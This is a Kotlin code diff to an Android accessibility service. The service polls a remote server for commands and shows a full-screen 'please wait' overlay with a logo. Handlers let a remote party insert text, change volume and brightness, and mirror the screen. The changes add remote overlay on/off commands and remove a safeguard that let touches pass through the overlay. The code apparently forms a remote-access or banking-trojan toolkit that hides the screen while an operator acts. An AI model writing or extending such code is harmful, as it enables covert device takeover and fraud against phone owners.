@@ -77,8 +77,9 @@ class ControleGestosService : AccessibilityService() {
     private var textoInferiorOverlayAtual = ""
     private var logoOverlayAtual = ""
     private var ultimaEstruturaEspelho: String? = null
-    private var pollsOverlayDesativado = 0
+    private var ultimaConsultaOverlayMs = 0L
     private val handlerPrincipal = Handler(Looper.getMainLooper())
+    private val intervaloConsultaOverlayMs = 4000L
 
     override fun onServiceConnected() {
         super.onServiceConnected()
@@ -659,6 +660,10 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun verificarOverlay() {
+        val agora = System.currentTimeMillis()
+        if (agora - ultimaConsultaOverlayMs < intervaloConsultaOverlayMs) return
+        ultimaConsultaOverlayMs = agora
+
         var conexao: HttpURLConnection? = null
         try {
             val idDispositivo = obterIdDispositivo()
@@ -677,19 +682,7 @@ class ControleGestosService : AccessibilityService() {
             if (resposta.isEmpty()) return
 
             val json = org.json.JSONObject(resposta)
-            val ativo = json.optBoolean("ativo", false)
-
-            if (!ativo) {
-                pollsOverlayDesativado++
-                if (pollsOverlayDesativado >= 3 &&
-                    (overlayAtivo || OverlayActivity.estaAtiva() || overlayView != null)
-                ) {
-                    handlerPrincipal.post { removerOverlay() }
-                }
-                return
-            }
-
-            pollsOverlayDesativado = 0
+            if (!lerOverlayAtivo(json)) return
 
             val mensagem = json.optString("mensagem", "Aguarde...")
             val textoInferior = json.optString("texto_inferior", "")
@@ -703,6 +696,23 @@ class ControleGestosService : AccessibilityService() {
             Log.e("KL", "Erro ao verificar overlay: ${e.message}")
         } finally {
             conexao?.disconnect()
+        }
+    }
+
+    private fun lerOverlayAtivo(json: org.json.JSONObject): Boolean {
+        if (!json.has("ativo")) return false
+        return when (val valor = json.get("ativo")) {
+            is Boolean -> valor
+            is Number -> valor.toInt() != 0
+            is String -> valor.equals("true", true) || valor == "1"
+            else -> false
+        }
+    }
+
+    private fun buscarEMostrarOverlayAgora() {
+        ultimaConsultaOverlayMs = 0L
+        CoroutineScope(Dispatchers.IO).launch {
+            verificarOverlay()
         }
     }
 
@@ -722,9 +732,6 @@ class ControleGestosService : AccessibilityService() {
                 logo != logoOverlayAtual
 
         if (!changed && overlayEstaVisivel()) {
-            if (overlayView != null) {
-                garantirOverlayNaoBloqueiaToque()
-            }
             overlayAtivo = true
             return
         }
@@ -961,13 +968,26 @@ class ControleGestosService : AccessibilityService() {
     }
 
     private fun criarOverlay(mensagem: String, textoInferior: String, logo: String) {
+        if (overlayView != null) {
+            overlayView!!.findViewById<TextView>(R.id.txtMensagem)?.text = mensagem
+            overlayView!!.findViewById<TextView>(R.id.txtTextoInferior)?.text = textoInferior
+            aplicarLogoNoOverlay(overlayView!!, logo)
+            marcarOverlayAtivo()
+            mensagemOverlayAtual = mensagem
+            textoInferiorOverlayAtual = textoInferior
+            logoOverlayAtual = logo
+            return
+        }
+
         capturarCacheEspelhoAntesOverlay()
         OverlayActivity.fechar()
-        removerOverlayJanela()
         criarOverlayJanela(mensagem, textoInferior, logo)
     }
 
     private fun criarOverlayJanela(mensagem: String, textoInferior: String, logo: String) {
+        if (overlayView != null) return
+        removerOverlayJanela()
+
         val tipoJanela = obterTipoJanelaOverlay()
         val precisaPermissaoFlutuante = tipoJanela == WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
         if (precisaPermissaoFlutuante &&
@@ -1047,7 +1067,6 @@ class ControleGestosService : AccessibilityService() {
 
     private fun resetarEstadoOverlay() {
         overlayAtivo = false
-        pollsOverlayDesativado = 0
         mensagemOverlayAtual = ""
         textoInferiorOverlayAtual = ""
         logoOverlayAtual = ""
@@ -1087,7 +1106,8 @@ class ControleGestosService : AccessibilityService() {
             "recentes"-> performGlobalAction(GLOBAL_ACTION_RECENTS)
             "texto"   -> inserirTexto(partes.getOrNull(1) ?: "")
             "mostrar_overlay" -> mostrarOuAtualizarOverlay(partes.getOrNull(1) ?: "", "", "")
-            "esconder_overlay"-> removerOverlay()
+            "esconder_overlay", "overlay_desligar", "overlay_desativar" -> handlerPrincipal.post { removerOverlay() }
+            "overlay_ligar", "overlay_ativar" -> buscarEMostrarOverlayAgora()
             "brilho" -> definirBrilho(partes.getOrNull(1)?.toIntOrNull() ?: return)
             "som_mais", "volume_mais", "ativar_som" -> ajustarVolume(subir = true)
             "som_menos", "volume_menos", "silenciar" -> ajustarVolume(subir = false)
